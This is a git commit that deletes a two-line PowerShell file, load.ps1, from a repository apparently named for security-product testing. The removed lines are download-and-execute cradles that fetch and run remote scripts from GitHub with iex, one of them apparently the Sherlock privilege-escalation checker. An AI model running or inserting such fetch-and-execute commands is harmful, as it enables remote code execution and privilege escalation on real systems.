fbb63df69d13698f1a8f9954a47d799659089868
St3v3a <steve.atco@gmail.com>
2021-03-24 10:06:42 +0000

    Delete load.ps1

--- load.ps1
+++
@@ -1,2 +0,0 @@
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/St3v3a/falcontest/master/RunSec.ps1')
-Run-SecurePS -argument " -c iex('https://raw.githubusercontent.com/St3v3a/falcontest/master/Sherlock.ps1')"
